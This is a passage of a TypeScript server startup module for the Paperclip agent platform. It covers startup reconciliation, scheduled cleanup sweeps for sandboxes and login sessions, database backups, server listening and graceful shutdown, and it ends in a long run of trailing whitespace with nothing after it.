        result.reconciled > 0
        || result.restarted > 0
        || result.restartFailed > 0
        || result.backfilled > 0
      ) {
        logger.warn(
          {
            reconciled: result.reconciled,
            adopted: result.adopted,
            stopped: result.stopped,
            // Managed HTTP-only services taken down so they come back on a
            // verified HTTPS origin (PAP-17158).
            httpsBackfilled: result.backfilled,
            restarted: result.restarted,
            restartFailed: result.restartFailed,
          },
          "reconciled persisted runtime services from a previous server process",
        );
      }
    })
    .catch((err) => {
      logger.error({ err }, "startup reconciliation of persisted runtime services failed");
    });

  // Backfill auth.json into any already-isolated codex_local managed home that
  // was created by the #8272 isolation guard before the Phase 1 seeding fix.
  // Idempotent; the Phase 1 execute-time seeding covers new strandings.
  void reconcileCodexLocalManagedHomesOnStartup(db)
    .then((result) => {
      if (result.seeded > 0 || result.failed > 0) {
        logger.warn(
          { seeded: result.seeded, failed: result.failed, scanned: result.scanned },
          "reconciled codex_local managed homes (backfilled missing auth)",
        );
      }
      if (result.sourceAuthMissing > 0) {
        logger.warn(
          { sourceAuthMissing: result.sourceAuthMissing, scanned: result.scanned },
          "could not backfill codex_local managed homes because shared Codex auth is missing",
        );
      }
    })
    .catch((err) => {
      logger.error({ err }, "startup reconciliation of codex_local managed homes failed");
    });

  void reconcileBuiltInAgentsOnStartup(db as any)
    .then((result) => {
      if (
        result.reconciled > 0
        || result.unknown > 0
        || result.duplicates > 0
        || result.autoEnsured > 0
        || result.companyFailures > 0
      ) {
        logger.warn(
          result,
          "startup reconciliation of built-in agents complete",
        );
      }
    })
    .catch((err) => {
      logger.error({ err }, "startup reconciliation of built-in agents failed");
    });

  // Force the instance onto the Kubernetes sandbox provider when configured via
  // env (PAPERCLIP_EXECUTION_MODE=kubernetes). Runs BEFORE the heartbeat resumes
  // queued runs so the policy + managed k8s environments are in place. A bad
  // PAPERCLIP_EXECUTION_MODE / PAPERCLIP_K8S_* value throws and fails startup
  // (fail-loud) rather than silently allowing local execution.
  try {
    const policyResult = await bootstrapExecutionPolicyFromEnv(db as any);
    if (policyResult) {
      logger.warn(
        {
          executionMode: policyResult.executionMode,
          companiesConfigured: policyResult.companiesConfigured,
        },
        "forced execution policy applied at startup",
      );
    }
  } catch (err) {
    logger.error({ err }, "failed to apply forced execution policy from environment");
    throw err;
  }

  // Ensure sandbox environments declared in the managed-config document
  // (`environments` section) before the heartbeat resumes queued runs. The
  // document already parsed fail-closed above; the ensure step itself is
  // fail-safe per entry (a degraded boot beats a fleet-wide crash loop), but
  // a contradictory deployment that also forces PAPERCLIP_EXECUTION_MODE
  // throws here and fails startup. `pluginsReady` sequences the ensure after
  // the bundled-plugin install/load pass so a declared environment never
  // activates before its provider driver is registered; the worker manager
  // additionally gates each entry on a live plugin worker (and archives the
  // row of a provider that did not come up).
  try {
    const bundledPluginsStartup = (app as { locals?: { bundledPluginsStartup?: Promise<unknown> } })
      .locals?.bundledPluginsStartup;
    const managedEnvironmentsResult = await applyManagedEnvironments(db as any, managedConfig, {
      pluginsReady: bundledPluginsStartup,
      workerManager: pluginWorkerManager,
    });
    if (managedEnvironmentsResult) {
      logger.warn(managedEnvironmentsResult, "managed sandbox environments ensured from managed config");
    }
  } catch (err) {
    logger.error({ err }, "failed to apply managed environments from managed config");
    throw err;
  }

  let drainHeartbeatRunsForShutdown: ((
    signal: "SIGINT" | "SIGTERM",
    runIds?: readonly string[] | null,
  ) => Promise<unknown>) | null = null;
  let prepareHotRestartShutdown: ((signal: "SIGINT" | "SIGTERM") => Promise<{
    skipDrain: boolean;
    drainRunIds?: string[];
  }>) | null = null;
  let heartbeatSchedulerStopped = false;
  let heartbeatSchedulerInterval: ReturnType<typeof setInterval> | null = null;
  const heartbeatSchedulerInFlight = new Set<Promise<void>>();
  const trackHeartbeatSchedulerWork = (work: Promise<unknown>) => {
    let tracked: Promise<void>;
    tracked = Promise.resolve(work)
      .then(() => undefined, () => undefined)
      .finally(() => {
        heartbeatSchedulerInFlight.delete(tracked);
      });
    heartbeatSchedulerInFlight.add(tracked);
  };
  const waitForHeartbeatSchedulerIdle = async () => {
    while (heartbeatSchedulerInFlight.size > 0) {
      await Promise.allSettled([...heartbeatSchedulerInFlight]);
    }
  };
  const startHeartbeatSchedulerInterval = (callback: () => void) => {
    heartbeatSchedulerInterval = setInterval(callback, config.heartbeatSchedulerIntervalMs);
    heartbeatSchedulerInterval?.unref?.();
  };
  const externalObjects = externalObjectService(db as any, {
    pluginWorkerManager,
    enabled: async () => (await instanceSettingsService(db).getExperimental()).enableExternalObjects === true,
  });
  const scheduleExternalObjectRefreshSweep = (now = new Date()) => {
    if (heartbeatSchedulerStopped) return;
    trackHeartbeatSchedulerWork(externalObjects
      .refreshDueObjectsForActiveCompanies(50, now)
      .then((result) => {
        if (result.checked > 0 || result.refreshed > 0) {
          logger.info({ ...result }, "external-object scheduler tick refreshed due objects");
        }
      })
      .catch((err) => {
        logger.error({ err }, "external-object scheduler tick failed");
      }));
  };

  // The retry backstop for orphan sandboxes. An acquire that rejects a
  // foreign-company insert tears the provisioned sandbox down. If that teardown
  // also fails, the acquire records a lease-less `pending_cleanup` lease row. No
  // other path releases that sandbox, so the master pending-cleanup sweep retries
  // the provider teardown and releases the orphan. The sweep runs on startup and
  // on the scheduler interval.
  //
  // This backstop is independent of the heartbeat scheduler toggle. A leaked
  // provider sandbox costs money whether or not the instance schedules
  // heartbeats, so both the enabled and the disabled path run the sweep. A
  // disabled heartbeat scheduler must not strand a paid sandbox forever.
  //
  // The master pending-cleanup sweep is the single owner of these rows. Its
  // atomic per-attempt claim makes two overlapping sweeps safe, so the enabled
  // path can also run the sweep from the orphaned-run reaper without a second
  // teardown. The heartbeat scheduler owns the sweep when it is enabled; the
  // disabled path creates its own runtime to own the same sweep.
  // The interval sweep waits this long after a lease's last write before it
  // retries the teardown. The window matches the orphaned-run reaper staleness,
  // so a just-failed lease does not draw a retry on every tick. The startup
  // sweep passes zero, so a restart retries a stranded orphan at once.
  const ENVIRONMENT_LEASE_CLEANUP_SWEEP_BACKOFF_MS = 5 * 60 * 1000;
  const environmentLeaseCleanupHeartbeat =
    heartbeat ?? heartbeatService(db as any, { pluginWorkerManager });
  const runEnvironmentLeaseCleanupSweep = (backoffMs: number) =>
    environmentLeaseCleanupHeartbeat
      .sweepPendingCleanupLeases({ backoffMs })
      .then((result) => {
        if (result.destroyed > 0 || result.capped > 0) {
          logger.info(result, "environment lease cleanup sweep retried orphan sandbox teardowns");
        }
      })
      .catch((err) => {
        logger.error({ err }, "environment lease cleanup sweep failed");
      });
  const scheduleEnvironmentLeaseCleanupSweep = () => {
    if (heartbeatSchedulerStopped) return;
    trackHeartbeatSchedulerWork(runEnvironmentLeaseCleanupSweep(ENVIRONMENT_LEASE_CLEANUP_SWEEP_BACKOFF_MS));
  };

  if (heartbeat) {
    const secretProposals = createSecretProposalsService(db as any);
    const decisionExecutor = decisionService(db as any, decisionServiceOptions);
    const retentionExecutor = decisionRetentionService(db as any, {
      notifyOriginAgent: createDecisionRetentionNotifyOriginAgent(heartbeat.wakeup),
    });
    drainHeartbeatRunsForShutdown = (signal, runIds) => (
      heartbeat.drainRunningRunsForShutdown(signal, new Date(), runIds)
    );
    prepareHotRestartShutdown = heartbeat.prepareHotRestartShutdown;
    const environmentCustomImages = environmentCustomImageService(db as any, { pluginWorkerManager });
    const routines = routineService(db as any, { pluginWorkerManager });
    const statusCards = statusCardService(db as any);
    const issues = issueService(db as any);
    const mergedPullRequestConfirmations = issueThreadInteractionService(db as any, {
      wakeup: heartbeat.wakeup,
    });
    const terminalWorkspaces = executionWorkspaceService(db as any, {
      workspaceReaperCooldownDays: config.workspaceReaperCooldownDays,
    });
    const scheduleMergedPullRequestConfirmationSweep = () => {
      if (heartbeatSchedulerStopped) return;
      trackHeartbeatSchedulerWork(mergedPullRequestConfirmations
        .sweepMergedPullRequestConfirmations()
        .then((result) => {
          if (result.accepted > 0) {
            logger.info(result, "accepted merge confirmations for merged pull requests");
          }
        })
        .catch((err) => {
          logger.error({ err }, "merged pull-request confirmation sweep failed");
        }));
    };
    // Emit a periodic signal when the reaper inspects candidates but archives
    // none, so an inert reaper that skips every candidate is never fully silent.
    // The throttle keeps the 30s cadence from flooding the log.
    let lastTerminalWorkspaceSkipLogAt = 0;
    const terminalWorkspaceSkipLogIntervalMs = 10 * 60 * 1000;
    const scheduleTerminalWorkspaceSweep = () => {
      if (heartbeatSchedulerStopped) return;
      trackHeartbeatSchedulerWork(terminalWorkspaces
        .sweepTerminalWorkspaces()
        .then((result) => {
          if (result.archived > 0 || result.cleanupFailed > 0) {
            logger.info(result, "terminal issue workspace reaper changed workspace state");
            return;
          }
          const skipped =
            result.skippedActiveRun
            + result.skippedNonTerminalTree
            + result.skippedUndelivered
            + result.skippedRace
            + result.skippedCooldown;
          const nowMs = Date.now();
          if (skipped > 0 && nowMs - lastTerminalWorkspaceSkipLogAt >= terminalWorkspaceSkipLogIntervalMs) {
            lastTerminalWorkspaceSkipLogAt = nowMs;
            logger.info(result, "terminal issue workspace reaper skipped all candidates");
          }
        })
        .catch((err) => {
          logger.error({ err }, "terminal issue workspace reaper failed");
        }));
    };

    // The restart-safe cleanup backstop for adapter login sessions. The
    // in-process five-minute timer stays the primary control. This reaper runs
    // on startup and on the scheduler interval. It deletes the login sandbox for
    // any expired non-terminal session, retries the delete for any terminal
    // session left in `cleanup_pending`, and deletes a tagged lease that no live
    // session references.
    const adapterLoginReaper = createCodexDeviceLoginReaper({
      store: createDbAdapterAuthSessionStore(db as any),
      runtime: createProductionLoginSessionReaperRuntime({
        db: db as any,
        environmentRuntime: environmentRuntimeService(db as any, { pluginWorkerManager }),
      }),
    });
    const logAdapterLoginReaperResult = (
      result: Awaited<ReturnType<typeof adapterLoginReaper.sweep>>,
    ) => {
      if (
        result.expiredTimedOut > 0 ||
        result.cleanupCleared > 0 ||
        result.orphanLeasesDeleted > 0 ||
        result.cleanupPendingRemaining > 0
      ) {
        logger.info(result, "adapter login reaper swept login sessions");
      }
    };
    const scheduleAdapterLoginReaperSweep = () => {
      if (heartbeatSchedulerStopped) return;
      trackHeartbeatSchedulerWork(adapterLoginReaper
        .sweep()
        .then(logAdapterLoginReaperResult)
        .catch((err) => {
          logger.error({ err }, "adapter login reaper sweep failed");
        }));
    };

    // The restart-safe cleanup backstop for the Claude setup-token login flow. It
    // runs on startup and on the scheduler interval, so a sandbox lease survives a
    // server restart and a release failure. It releases any lease whose login
    // session is terminal, past its deadline, or already consumed.
    const setupTokenReaper = createProductionSetupTokenReaper({
      db: db as any,
      environmentRuntime: environmentRuntimeService(db as any, { pluginWorkerManager }),
      log: (line) => logger.info(line),
    });
    const logSetupTokenReaperResult = (
      result: Awaited<ReturnType<typeof setupTokenReaper.sweep>>,
    ) => {
      if (result.released > 0 || result.failed > 0) {
        logger.info(result, "setup-token login reaper released leases");
      }
    };
    const scheduleSetupTokenReaperSweep = () => {
      if (heartbeatSchedulerStopped) return;
      trackHeartbeatSchedulerWork(setupTokenReaper
        .sweep()
        .then(logSetupTokenReaperResult)
        .catch((err) => {
          logger.error({ err }, "setup-token login reaper sweep failed");
        }));
    };

    const tools = toolAccessService(db as any, {
      deploymentMode: config.deploymentMode,
      deploymentExposure: config.deploymentExposure,
      trustedLocalStdioRuntimeHost: process.env.PAPERCLIP_TRUSTED_MCP_RUNTIME_HOST
        ?? process.env.PAPERCLIP_TOOL_RUNTIME_TRUSTED_HOST
        ?? null,
    });
    const worktreeRunExecutionActivation = await resolveWorktreeRunExecutionActivationState({
      getExperimental: () => instanceSettingsService(db).getExperimental(),
    });
    logger.info(
      {
        state: worktreeRunExecutionActivation.armed ? "armed" : "disarmed",
        cutoff: worktreeRunExecutionActivation.cutoff,
      },
      "worktree run-execution cutoff state",
    );
    const heartbeatSchedulingSuppression = await heartbeat.resolveSchedulingSuppression();

    // Reap orphaned runs before timer ticks start so wakeups cannot coalesce
    // into a dead "running" row during startup recovery.
    if (heartbeatSchedulingSuppression.suppressed) {
      logger.warn(
        { reason: heartbeatSchedulingSuppression.reason },
        "heartbeat scheduling suppressed for this runtime instance",
      );
    } else {
      const startupHeartbeatRecovery = (async () => {
        try {
          const hotRestart = await heartbeat.reconcileHotRestartAdoption();
          if (hotRestart.mode === "reported") {
            logger.info(
              hotRestart,
              "startup hot-restart adoption reconciliation complete",
            );
          }
        } catch (err) {
          logger.error(
            { err },
            "startup hot-restart adoption reconciliation failed - orphan reaper will serve as degraded backstop",
          );
        }

        for (let attempt = 1; attempt <= 2; attempt++) {
          try {
            const result = await heartbeat.reapOrphanedRuns();
            logger.info(
              { reaped: result.reaped, runIds: result.runIds },
              "startup reap of orphaned heartbeat runs complete",
            );
            break;
          } catch (err) {
            if (attempt < 2) {
              logger.warn({ err, attempt }, "startup reap failed, retrying");
            } else {
              logger.error(
                { err },
                "startup reap of orphaned heartbeat runs failed after retry - periodic reaper will serve as degraded backstop",
              );
            }
          }
        }

        const promotion = await heartbeat.promoteDueScheduledRetries();
        await heartbeat.resumeQueuedRuns();
        const reconciled = await heartbeat.reconcileStrandedAssignedIssues();
        if (
          promotion.promoted > 0 ||
          reconciled.assignmentDispatched > 0 ||
          reconciled.dispatchRequeued > 0 ||
          reconciled.continuationRequeued > 0 ||
          reconciled.successfulRunHandoffEscalated > 0 ||
          reconciled.escalated > 0
        ) {
          logger.warn(
            { promotedScheduledRetries: promotion.promoted, promotedScheduledRetryRunIds: promotion.runIds, ...reconciled },
            "startup heartbeat recovery changed assigned issue state",
          );
        }

        const issueGraphReconciled = await heartbeat.reconcileIssueGraphLiveness();
        if (issueGraphReconciled.escalationsCreated > 0 || issueGraphReconciled.dependencyWakesHealed > 0) {
          logger.warn(
            { ...issueGraphReconciled },
            "startup issue-graph liveness reconciliation changed issue graph state",
          );
        }

        const taskWatchdogsReconciled = await heartbeat.reconcileTaskWatchdogs();
        if (taskWatchdogsReconciled.triggered > 0) {
          logger.warn(
            { ...taskWatchdogsReconciled },
            "startup task-watchdog reconciliation triggered watchdog work",
          );
        }

        const scanned = await heartbeat.scanSilentActiveRuns();
        if (scanned.created > 0 || scanned.escalated > 0) {
          logger.warn({ ...scanned }, "startup active-run output watchdog created review work");
        }

        const swept = await heartbeat.sweepStaleIssueLocks();
        if (swept.cleared > 0) {
          logger.warn({ ...swept }, "startup stale-lock sweeper cleared issue locks");
        }

        const reviewed = await heartbeat.reconcileProductivityReviews();
        if (reviewed.created > 0 || reviewed.updated > 0 || reviewed.failed > 0) {
          logger.warn({ ...reviewed }, "startup productivity reconciliation created or updated review work");
        }
      })().catch((err) => {
        logger.error({ err }, "startup heartbeat recovery failed");
      });
      trackHeartbeatSchedulerWork(startupHeartbeatRecovery);
      await startupHeartbeatRecovery;
    }

    const setupCleanup = await environmentCustomImages.cleanupExpiredSetupSessions();
    if (setupCleanup.timedOut > 0 || setupCleanup.failed > 0) {
      logger.warn({ ...setupCleanup }, "startup environment customImage setup cleanup changed sessions");
    }

    const toolHealthSweep = await tools.sweepConnectionHealth();
    if (toolHealthSweep.failed > 0) {
      logger.warn({ ...toolHealthSweep }, "startup tool connection health sweep found failing connections");
    }
    await decisionExecutor.sweepExpired();

    // Run the adapter login reaper once at startup, so a login sandbox that
    // outlived a server restart is deleted before timer ticks start.
    await adapterLoginReaper
      .sweep()
      .then(logAdapterLoginReaperResult)
      .catch((err) => {
        logger.error({ err }, "startup adapter login reaper sweep failed");
      });

    // Run the setup-token login reaper once at startup, so a login sandbox lease
    // that outlived a server restart releases before timer ticks start.
    await setupTokenReaper
      .sweep()
      .then(logSetupTokenReaperResult)
      .catch((err) => {
        logger.error({ err }, "startup setup-token login reaper sweep failed");
      });

    // Retry any orphan sandbox teardown left by a failed acquire before a server
    // restart, so a leaked sandbox does not stay allocated across the restart.
    await runEnvironmentLeaseCleanupSweep(0);

    const runRetentionSweep = async () => {
      const activeCompanies = await db.select({ id: companies.id }).from(companies).where(eq(companies.status, "active"));
      let archived = 0;
      for (const company of activeCompanies) {
        // Cursor pagination rebuilds the whole feed for every page; one
        // unscoped all-items build keeps this sweep at a single feed build
        // per company per tick.
        const page = await attentionService(db as any).list(company.id, {
          includeDismissed: true,
          all: true,
          allowUnscopedAll: true,
        });
        archived += await retentionExecutor.autoArchive({ companyId: company.id, items: page.items });
      }
      const notifications = await retentionExecutor.deliverNotifications();
      return { archived, ...notifications };
    };
    await runRetentionSweep();

    startHeartbeatSchedulerInterval(() => {
      // Track the outer async callback as well as the work it starts. Shutdown
      // can then wait through an already-running suppression check before it
      // captures the authoritative set of running heartbeat rows.
      trackHeartbeatSchedulerWork((async () => {
        if (heartbeatSchedulerStopped) return;
        trackHeartbeatSchedulerWork(decisionExecutor.sweepExpired().catch((err: unknown) => {
          logger.error({ err }, "decision expiry sweep failed");
        }));
        trackHeartbeatSchedulerWork(runRetentionSweep().catch((err: unknown) => {
          logger.error({ err }, "decision retention sweep failed");
        }));
        const sweptRuntimeStatuses = heartbeat.sweepExpiredRuntimeStatuses();
        if (sweptRuntimeStatuses > 0) {
          logger.info(
            { swept: sweptRuntimeStatuses },
            "heartbeat runtime-status sweeper cleared expired entries",
          );
        }

        if (!(await heartbeat.resolveSchedulingSuppression()).suppressed) {
          trackHeartbeatSchedulerWork(heartbeat
            .tickTimers(new Date())
            .then((result) => {
              if (result.enqueued > 0) {
                logger.info({ ...result }, "heartbeat timer tick enqueued runs");
              }
            })
            .catch((err) => {
              logger.error({ err }, "heartbeat timer tick failed");
            }));
        }

        if (heartbeatSchedulerStopped) return;
        scheduleExternalObjectRefreshSweep(new Date());

        if (heartbeatSchedulerStopped) return;
        scheduleMergedPullRequestConfirmationSweep();
        scheduleTerminalWorkspaceSweep();
        scheduleAdapterLoginReaperSweep();
        scheduleSetupTokenReaperSweep();
        scheduleEnvironmentLeaseCleanupSweep();

        if (heartbeatSchedulerStopped) return;
        trackHeartbeatSchedulerWork(routines
          .tickScheduledTriggers(new Date())
          .then((result) => {
            if (result.triggered > 0) {
              logger.info({ ...result }, "routine scheduler tick enqueued runs");
            }
          })
          .catch((err) => {
            logger.error({ err }, "routine scheduler tick failed");
          }));

        if (heartbeatSchedulerStopped) return;
        trackHeartbeatSchedulerWork((async () => {
          const experimental = await instanceSettingsService(db).getExperimental();
          if (experimental.enableStatusCards !== true) return;
          const result = await statusCards.tickDueStatusCards(new Date());
          await Promise.all(result.enqueued.map(async ({ cardId, generatingIssue }) => {
            try {
              await queueIssueAssignmentWakeup({
                heartbeat,
                issue: generatingIssue,
                reason: "status_card_update_assigned",
                mutation: "status_card.scheduler_update_requested",
                contextSource: "status_card_scheduler",
                requestedByActorType: "system",
                taskKey: `status-card:${cardId}`,
                rethrowOnError: true,
              });
            } catch (err) {
              await issues.update(generatingIssue.id, { status: "cancelled" });
              throw err;
            }
          }));
          if (result.evaluated > 0 || result.enqueued.length > 0) {
            logger.info({ evaluated: result.evaluated, enqueued: result.enqueued.length }, "status-card scheduler tick complete");
          }
        })().catch((err) => {
          logger.error({ err }, "status-card scheduler tick failed");
        }));

        if (heartbeatSchedulerStopped) return;
        trackHeartbeatSchedulerWork(environmentCustomImages
          .cleanupExpiredSetupSessions()
          .then((result) => {
            if (result.timedOut > 0 || result.failed > 0) {
              logger.warn({ ...result }, "environment customImage setup cleanup changed sessions");
            }
          })
          .catch((err) => {
            logger.error({ err }, "environment customImage setup cleanup failed");
          }));

        if (heartbeatSchedulerStopped) return;
        trackHeartbeatSchedulerWork(tools
          .sweepConnectionHealth()
          .then((swept) => {
            if (swept.failed > 0) {
              logger.warn({ ...swept }, "periodic tool connection health sweep found failing connections");
            }
          })
          .catch((err) => {
            logger.error({ err }, "periodic tool connection health sweep failed");
          }));

        trackHeartbeatSchedulerWork(secretProposals.sweepExpired()
          .then((expired) => {
            if (expired > 0) logger.warn({ expired }, "periodic secret proposal expiry scrubbed proposals");
          })
          .catch((err) => {
            logger.error({ err }, "periodic secret proposal expiry sweep failed");
          }));

        if (heartbeatSchedulerStopped) return;
        if (!(await heartbeat.resolveSchedulingSuppression()).suppressed) {
          // Periodically reap orphaned runs (5-min staleness threshold) and make sure
          // persisted queued work is still being driven forward.
          trackHeartbeatSchedulerWork(heartbeat
            .reapOrphanedRuns({ staleThresholdMs: 5 * 60 * 1000 })
            .then(() => heartbeat.promoteDueScheduledRetries())
            .then(async (promotion) => {
              await heartbeat.resumeQueuedRuns();
              const reconciled = await heartbeat.reconcileStrandedAssignedIssues();
              if (
                promotion.promoted > 0 ||
                reconciled.assignmentDispatched > 0 ||
                reconciled.dispatchRequeued > 0 ||
                reconciled.continuationRequeued > 0 ||
                reconciled.successfulRunHandoffEscalated > 0 ||
                reconciled.escalated > 0
              ) {
                logger.warn(
                  { promotedScheduledRetries: promotion.promoted, promotedScheduledRetryRunIds: promotion.runIds, ...reconciled },
                  "periodic heartbeat recovery changed assigned issue state",
                );
              }
            })
            .then(async () => {
              const reconciled = await heartbeat.reconcileIssueGraphLiveness();
              if (reconciled.escalationsCreated > 0 || reconciled.dependencyWakesHealed > 0) {
                logger.warn({ ...reconciled }, "periodic issue-graph liveness reconciliation changed issue graph state");
              }
            })
            .then(async () => {
              const reconciled = await heartbeat.reconcileTaskWatchdogs();
              if (reconciled.triggered > 0) {
                logger.warn({ ...reconciled }, "periodic task-watchdog reconciliation triggered watchdog work");
              }
            })
            .then(async () => {
              const scanned = await heartbeat.scanSilentActiveRuns();
              if (scanned.created > 0 || scanned.escalated > 0) {
                logger.warn({ ...scanned }, "periodic active-run output watchdog created review work");
              }
            })
            .then(async () => {
              const swept = await heartbeat.sweepStaleIssueLocks();
              if (swept.cleared > 0) {
                logger.warn({ ...swept }, "periodic stale-lock sweeper cleared issue locks");
              }
            })
            .then(async () => {
              const reviewed = await heartbeat.reconcileProductivityReviews();
              if (reviewed.created > 0 || reviewed.updated > 0 || reviewed.failed > 0) {
                logger.warn({ ...reviewed }, "periodic productivity reconciliation created or updated review work");
              }
            })
            .catch((err) => {
              logger.error({ err }, "periodic heartbeat recovery failed");
            }));
        }
      })().catch((err) => {
        logger.error({ err }, "heartbeat scheduler tick failed");
      }));
    });
  } else {
    // The heartbeat scheduler is disabled, but the orphan-sandbox cleanup sweep
    // is still required. A failed acquire can leak a paid provider sandbox, so
    // this path retries the teardown at startup and on the interval, exactly as
    // the enabled path does.
    await runEnvironmentLeaseCleanupSweep(0);
    startHeartbeatSchedulerInterval(() => {
      scheduleExternalObjectRefreshSweep(new Date());
      scheduleEnvironmentLeaseCleanupSweep();
    });
  }
  
  if (config.databaseBackupEnabled) {
    const backupIntervalMs = config.databaseBackupIntervalMinutes * 60 * 1000;

    logger.info(
      {
        intervalMinutes: config.databaseBackupIntervalMinutes,
        retentionSource: "instance-settings-db",
        backupDir: config.databaseBackupDir,
      },
      "Automatic database backups enabled",
    );
    setInterval(() => {
      void runServerDatabaseBackup("scheduled").catch(() => {
        // runServerDatabaseBackup already logs the failure with context.
      });
    }, backupIntervalMs);
  }
  
  // Wait for external adapters to finish loading before accepting requests.
  // Without this, adapter type validation (assertKnownAdapterType) would
  // reject valid external adapter types during the startup loading window.
  const { waitForExternalAdapters } = await import("./adapters/registry.js");
  await waitForExternalAdapters();

  // Reconcile the agent-creation picker to the declaratively-configured adapter
  // set (PAPERCLIP_ADAPTERS). Must run after external adapters are loaded so the
  // known-adapter list is complete. Fail loud on misconfig (a declared adapter
  // with no implementation), consistent with the execution-policy bootstrap:
  // log the structured error, then rethrow to fail startup.
  try {
    reconcileAdapterAvailability(parseAdapterRegistryEnv());
  } catch (err) {
    logger.error({ err }, "failed to reconcile adapter availability from PAPERCLIP_ADAPTERS");
    throw err;
  }

  await new Promise<void>((resolveListen, rejectListen) => {
    const onError = (err: Error) => {
      server.off("error", onError);
      rejectListen(err);
    };

    server.once("error", onError);
    server.listen(listenPort, config.host, () => {
      server.off("error", onError);
      logger.info(`Server listening on ${config.host}:${listenPort}`);
      void systemdNotify(["--ready", `--status=Listening on ${config.host}:${listenPort}`]).then((notified) => {
        if (notified) logger.info("Notified systemd that Paperclip is ready");
      });
      if (process.env.PAPERCLIP_OPEN_ON_LISTEN === "true") {
        const openHost = config.host === "0.0.0.0" || config.host === "::" ? "127.0.0.1" : config.host;
        const url = `http://${openHost}:${listenPort}`;
        void import("open")
          .then((mod) => mod.default(url))
          .then(() => {
            logger.info(`Opened browser at ${url}`);
          })
          .catch((err) => {
            logger.warn({ err, url }, "Failed to open browser on startup");
          });
      }
        printStartupBanner({
          bind: config.bind,
          host: config.host,
          deploymentMode: config.deploymentMode,
        deploymentExposure: config.deploymentExposure,
        authReady,
        requestedPort: requestedListenPort,
        listenPort,
        uiMode,
        db: startupDbInfo,
        migrationSummary,
        heartbeatSchedulerEnabled: config.heartbeatSchedulerEnabled,
        heartbeatSchedulerIntervalMs: config.heartbeatSchedulerIntervalMs,
        databaseBackupEnabled: config.databaseBackupEnabled,
        databaseBackupIntervalMinutes: config.databaseBackupIntervalMinutes,
        databaseBackupRetentionDays: config.databaseBackupRetentionDays,
        databaseBackupDir: config.databaseBackupDir,
      });

      const boardClaimUrl = getBoardClaimWarningUrl(config.host, listenPort);
      if (boardClaimUrl) {
        const red = "\x1b[41m\x1b[30m";
        const yellow = "\x1b[33m";
        const reset = "\x1b[0m";
        console.log(
          [
            `${red}  BOARD CLAIM REQUIRED  ${reset}`,
            `${yellow}This instance was previously local_trusted and still has local-board as the only admin.${reset}`,
            `${yellow}Sign in with a real user and open this one-time URL to claim ownership:${reset}`,
            `${yellow}${boardClaimUrl}${reset}`,
            `${yellow}If you are connecting over Tailscale, replace the host in this URL with your Tailscale IP/MagicDNS name.${reset}`,
          ].join("\n"),
        );
      }

      resolveListen();
    });
  });
  
  {
    const shutdown = async (signal: "SIGINT" | "SIGTERM") => {
      await systemdNotify(["--stopping", `--status=Stopping after ${signal}`]);
      heartbeatSchedulerStopped = true;
      if (heartbeatSchedulerInterval) {
        clearInterval(heartbeatSchedulerInterval);
        heartbeatSchedulerInterval = null;
      }

      const heartbeatShutdown = await coordinateHeartbeatSchedulerShutdown({
        signal,
        prepareHotRestartShutdown,
        waitForHeartbeatSchedulerIdle,
      });
      const skipHeartbeatDrain = heartbeatShutdown.hotRestart?.skipDrain === true;
      const selectiveDrainRunIds = heartbeatShutdown.hotRestart?.drainRunIds ?? null;
      if (skipHeartbeatDrain) {
        logger.info(
          { signal, hotRestart: heartbeatShutdown.hotRestart },
          "hot-restart shutdown prepared after scheduler quiescence; skipping graceful run drain",
        );
      } else if (heartbeatShutdown.preparationError) {
        logger.error(
          { err: heartbeatShutdown.preparationError, signal },
          "hot-restart shutdown preparation failed; falling back to graceful heartbeat run drain",
        );
      }

      const telemetryClient = getTelemetryClient();
      if (telemetryClient) {
        telemetryClient.stop();
        await telemetryClient.flush();
      }

      if (!skipHeartbeatDrain && drainHeartbeatRunsForShutdown) {
        try {
          const drain = await drainHeartbeatRunsForShutdown(signal, selectiveDrainRunIds);
          logger.info({ signal, drain }, "graceful heartbeat run drain complete");
        } catch (err) {
          logger.error({ err, signal }, "graceful heartbeat run drain failed");
        }
      }

      // Whatever the drain did not finalize (timed-out runs, the hot-restart
      // skip path) still has a local-only tail when the in-flight run-log
      // mirror is enabled; upload those tails now so an orderly restart
      // never loses run output. No-op when the mirror is off.
      try {
        await flushInFlightRunLogMirrors();
      } catch (err) {
        logger.error({ err, signal }, "run-log in-flight mirror flush failed");
      }

      const appShutdown = (app as { locals?: { paperclipShutdown?: () => Promise<void> } }).locals
        ?.paperclipShutdown;
      const stopEmbeddedPostgres = embeddedPostgres && embeddedPostgresStartedByThisProcess
        ? () => embeddedPostgresSupervisor?.shutdown() ?? embeddedPostgres!.stop()
        : null;

      // Await the ordered application teardown before the process exits. A live
      // setup-token login session must stop and release its sandbox lease before
      // the database and the provider stop, so an orderly shutdown never leaves a
      // sandbox lease or confidential login state alive past the process exit.
      await finalizeServerShutdown({
        signal,
        shutdownAppServices: appShutdown,
        stopEmbeddedPostgres,
        shutdownInstrumentation,
        log: logger,
      });

      process.exit(0);
    };

    process.once("SIGINT", () => {
      void shutdown("SIGINT");
    });
    process.once("SIGTERM", () => {
      void shutdown("SIGTERM");
    });
  }

  return {
    server,
    host: config.host,
    listenPort,
    apiUrl: configuredApiUrl,
    databaseUrl: activeDatabaseConnectionString,
  };
}

function isMainModule(metaUrl: string): boolean {
  const entry = process.argv[1];
  if (!entry) return false;
  try {
    return pathToFileURL(resolve(entry)).href === metaUrl;
  } catch {
    return false;
  }
}

if (isMainModule(import.meta.url)) {
  void startServer().catch((err) => {
    logger.error({ err }, "Paperclip server failed to start");
    process.exit(1);
  });
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                